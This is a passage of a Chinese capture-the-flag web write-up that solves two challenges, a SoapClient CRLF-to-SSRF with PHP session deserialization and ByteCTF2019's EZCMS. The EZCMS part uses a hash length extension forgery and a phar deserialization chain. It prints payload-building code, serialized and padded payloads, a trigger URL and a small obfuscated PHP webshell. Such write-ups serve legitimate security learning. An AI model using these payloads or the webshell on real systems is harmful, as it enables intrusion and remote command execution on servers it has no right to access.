+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line">only localhost can get flag!</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
+
+<p>首先分析<code>index.php</code></p>
+<ul>
+<li><p>第3行:<code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>，当f=extract时存在变量覆盖漏洞</p>
+</li>
+<li><p>第4-7行:存在session伪造漏洞</p>
+</li>
+<li><p>最后一行:$b为implode，这里可以使用变量覆盖替换掉</p>
+</li>
+</ul>
+<p>当以本地127.0.0.1访问flag.php时，flag将出现在session中，容易联想到SSRF，但似乎没有点去构造SSRF的payload</p>
+<p>这里我们便可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> 方法来进行 <strong>SSRF</strong> </p>
+<p>举一个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://localhost:2333"</span>;</span><br><span class="line">$data = <span class="string">'demo=flag'</span>;</span><br><span class="line">$options = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"location"</span> =&gt; $target,</span><br><span class="line">    <span class="string">"user_agent"</span> =&gt; <span class="string">"mochazz\r\nCookie: PHPSESSID=123123\r\nContent-Length:"</span>.strlen($data).<span class="string">"\r\n\r\n"</span>.$data,</span><br><span class="line">  <span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>,<span class="comment">#必备，否则出错</span></span><br><span class="line">);</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,$options);</span><br><span class="line">$payload = serialize($attack);</span><br><span class="line">unserialize($payload)-&gt;ff(); <span class="comment">// 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于 <strong>PHP</strong> 中的原生 <strong>SoapClient</strong> 类存在 <strong>CRLF</strong> 漏洞，所以我们可以伪造任意 <strong>header</strong> 信息，上面的请求结果如下：</p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web3_1.jpg" width="800">
+
+<p>因此，本例中，我们首先可以控制第三行参数f，通过session_start()控制session序列化的处理器，更改为<code>php_serialize</code>，然后控制参数name，写入序列化后的数据(SoapClient类)，最终session值赋值给倒数第二行的a，并通过变量覆盖在最后一行调用SoapClient类中的__get()方法，使其向flag.php发送请求</p>
+<p>这里还要提及一点的是 session_start 函数从 <strong>PHP7</strong> 开始允许通过参数来设置 <strong>session</strong> 运行时配置。</p>
+<p>例如： <code>session_start(array(&#39;serialize_handler&#39; =&gt; &#39;php_serialize&#39;))</code> 将会设置 <code>session.serialize_handler=php_serialize</code> 。</p>
+<p>下面开始第一步，构造序列化payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://localhost/flag.php"</span>;</span><br><span class="line">$data = <span class="string">'demo=flag'</span>;</span><br><span class="line">$header = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'mochazz'</span>,</span><br><span class="line">    <span class="string">'Content-Type: application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=hacker'</span></span><br><span class="line">);</span><br><span class="line">$options = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"location"</span> =&gt; $target,<span class="comment">#访问地址</span></span><br><span class="line">    <span class="string">"user_agent"</span> =&gt; join(<span class="string">"\r\n"</span>,$header).<span class="string">"\r\nnContent-Length: "</span>.strlen($data).<span class="string">"\r\n\r\n"</span>.$data,</span><br><span class="line">  <span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>,<span class="comment">#必备，否则出错</span></span><br><span class="line">);</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,$options);</span><br><span class="line">$payload = serialize($attack);</span><br><span class="line"><span class="keyword">echo</span> urlencode($payload);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>获得payload</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>hello%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Flocalhost%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A143%<span class="number">3</span>A%<span class="number">22</span>mochazz%<span class="number">0</span>D%<span class="number">0</span>AContent-Type%<span class="number">3</span>A+application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">0</span>D%<span class="number">0</span>AX-Forwarded-For%<span class="number">3</span>A+<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">0</span>D%<span class="number">0</span>ACookie%<span class="number">3</span>A+PHPSESSID%<span class="number">3</span>Dhacker%<span class="number">0</span>D%<span class="number">0</span>AnContent-Length%<span class="number">3</span>A+<span class="number">9</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Ademo%<span class="number">3</span>Dflag%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web3_2.jpg" width="800">
+
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web3_3.jpg" width="800">
+
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web3_4.jpg" width="800">
+
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>这道题也学到很多，一是soupclient类的__get()存在CRLF漏洞，二是需要熟悉PHP session反序列化漏洞，以及设置session序列化处理器的设置</p>
+<h2 id="EZCMS"><a href="#EZCMS" class="headerlink" title="EZCMS"></a>EZCMS</h2><blockquote>
+<p>题目来源：ByteCTF2019    考察：哈希长度拓展攻击、phar反序列化</p>
+</blockquote>
+<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>发现源码<code>www.zip</code>，且整个代码的功能流程为：</p>
+<ul>
+<li><code>index.php</code>页面验证登陆，可以任意账号登陆到<code>upload.php</code>上传页面，但是只有admin账号才能进行文件上传。</li>
+<li>只要访问了<code>upload.php·</code>，就会在<code>sandbox</code>下生成一个<code>.htaccess</code>文件，内容为：<code>lolololol, i control all</code>；这会导致<code>sandbox</code>目录下所有文件无法正常访问。</li>
+<li>上传文件后，会返回文件的存储路径，view details可以进入<code>view.php</code>，会回显文件的mime类型以及文件路径</li>
+</ul>
+<p>关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">####################################登录处理###################################</span></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $username = urldecode($username);</span><br><span class="line">    $password = urldecode($password);</span><br><span class="line">    <span class="keyword">if</span> ($password === <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"u r not admin !!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">    $_SESSION[<span class="string">'password'</span>] = $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (login())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;location.href="upload.php";&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//function login()</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $secret = <span class="string">"********"</span>;</span><br><span class="line">    setcookie(<span class="string">"hash"</span>, md5($secret.<span class="string">"adminadmin"</span>));<span class="comment">//已知hash，和$secret的长度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">###################################上传处理####################################</span></span><br><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]))&#123;</span><br><span class="line">	<span class="comment">#获取上传文件信息</span></span><br><span class="line">    $admin = <span class="keyword">new</span> Admin($file_name, $file_tmp, $file_size);<span class="comment">//生成对象时判断是否admin</span></span><br><span class="line">    $admin-&gt;upload_file();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">#生成.htaccess文件</span></span><br><span class="line">    &#125;</span><br><span class="line">    closedir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Admin类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $file_tmp, $size)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_dir = <span class="string">'sandbox/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;upload_dir))&#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;upload_dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!is_file(<span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/.htaccess'</span>))&#123;</span><br><span class="line">            file_put_contents(<span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/.htaccess'</span>, <span class="string">'lolololol, i control all'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check = <span class="keyword">new</span> Check(<span class="keyword">$this</span>-&gt;file_tmp);</span><br><span class="line">        $profile = <span class="keyword">new</span> Profile();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $profile-&gt;is_admin();<span class="comment">//判断是否为admin</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//function is_admin()</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $secret = <span class="string">"********"</span>;</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_SESSION[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">"admin"</span> &amp;&amp; $password != <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">'user'</span>] === md5($secret.$username.$password))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从代码中可看出，第一步绕过<code>u r not admin</code>涉及哈希长度拓展</p>
+<p>现</p>
+<ul>
+<li>$hash == md5(<code>$secret</code>.”adminadmin”))；$hash已知、$secret长度已知，内容未知</li>
+<li>$_COOKIE[‘user’] === md5($secret.$username.$password))；$username==admin、$password!=admin</li>
+</ul>
+<p>关于哈希长度拓展的原理可参展网络教程，这里简单提一下利用方式，方便今后查阅</p>
+<blockquote>
+<p>已知 md5(<code>$secret</code>.”adminadmin”)) 的hash1值，但$secret未知</p>
+<p>如果要求 md5($secret.”adminadmin”.”test”) 的hash2值，由于$secret未知，无法正向求解</p>
+<p>但由于哈希长度拓展攻击，我们可以将已知的hash1值作为hash2值的前一个组，通过一系列变换直接算出hash2，而不需要知道$secret</p>
+<p>为了使结果准确，需要知道$secret的长度</p>
+</blockquote>
+<p>使用<code>hashpump</code></p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web4_1.jpg" width="800">
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账户名：admin</span><br><span class="line">密码：admin<span class="symbol">%80</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%90</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span>test</span><br><span class="line">Cookie['user'] = bcb<span class="number">7</span>fda<span class="number">11</span>f<span class="number">22</span><span class="keyword">c</span><span class="number">5992</span>de<span class="number">2093</span>ed<span class="number">0e5</span>a<span class="number">654</span></span><br></pre></td></tr></table></figure>
+
+<p>成功登录并进入上传处理过程</p>
+<p>上传由于存在<code>.htaccess</code>文件导致任意文件无法被访问并解析，因此存在两种思路：1、上传到其他目录 2、将<code>.htaccess</code>文件删除或改写；显然前者因目录不可控，无法进行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="keyword">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"nonono~"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $mine = mime_content_type(<span class="keyword">$this</span>-&gt;filepath);  <span class="comment">//unserialize</span></span><br><span class="line">        $store_path = <span class="keyword">$this</span>-&gt;open(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        $res[<span class="string">'mine'</span>] = $mine;</span><br><span class="line">        $res[<span class="string">'store_path'</span>] = $store_path;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename, $filepath)</span></span>&#123;</span><br><span class="line">        $res = <span class="string">"$filename is in $filepath"</span>;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;upload_file();<span class="comment">//当checker不存在upload_file()，执行__get()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关注<code>__destruct()</code>方法，可以看到用<code>$checker</code>调用了此类中不存的<code>upload_file()</code>函数，于是想到了<code>__call()</code>方法，继续寻找，发现<code>Profile</code>类中存在可利用的<code>__call()</code>方法，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $username;</span><br><span class="line"><span class="keyword">public</span> $password;</span><br><span class="line"><span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;password = $_SESSION[<span class="string">'password'</span>];</span><br><span class="line">    $secret = <span class="string">"********"</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">"admin"</span> &amp;&amp; <span class="keyword">$this</span>-&gt;password != <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">'user'</span>] === md5($secret.<span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);<span class="comment">//若上述checker为Profile类，则执行</span></span><br><span class="line">    <span class="comment">//admin构造成PHP内置的某个类，且需要存在open方法</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现能够使用的有一个内置类 <code>ZipArchive-&gt;open()</code>，构造phar文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;checker=new Admin();</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin=<span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">"/var/www/html/sandbox/c49aa5c1a3841904d3f07b20fec47d76/.htaccess"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=ZIPARCHIVE::OVERWRITE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o=<span class="keyword">new</span> File();</span><br><span class="line">unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>本地上执行后，将生成的<code>phar.phar</code>文件上传，同时上传一个免杀后的马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"sy"</span>.<span class="string">"stem"</span>;</span><br><span class="line">$a($_GET[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>访问构造的文件，触发序列化</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?filename=<span class="number">9</span><span class="keyword">c</span><span class="number">7</span>f<span class="number">4</span>a<span class="number">2</span>fbf<span class="number">2</span>dd<span class="number">3</span>dfb<span class="number">7051727</span>a<span class="number">644</span>d<span class="number">99</span>f.phar&amp;filepath=php://<span class="keyword">filter</span>/resource=phar://./sandbox/<span class="number">3</span>f<span class="number">8</span><span class="keyword">c</span><span class="number">45</span><span class="keyword">add</span><span class="number">7e4722</span>d<span class="number">7</span>a<span class="number">34</span>d<span class="number">2</span>fea<span class="number">8</span><span class="keyword">c</span><span class="number">87504</span>/<span class="number">9</span><span class="keyword">c</span><span class="number">7</span>f<span class="number">4</span>a<span class="number">2</span>fbf<span class="number">2</span>dd<span class="number">3</span>dfb<span class="number">7051727</span>a<span class="number">644</span>d<span class="number">99</span>f.phar</span><br></pre></td></tr></table></figure>
+
+<p>成功删除文件，得到flag</p>
+<img src="//songxpu.github.io/2019/09/28/CTF Web记录(二)/web4_3.jpg" width>
+
+<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>在比赛时做这道题，因为不知道哈希长度拓展卡在了第一步</p>
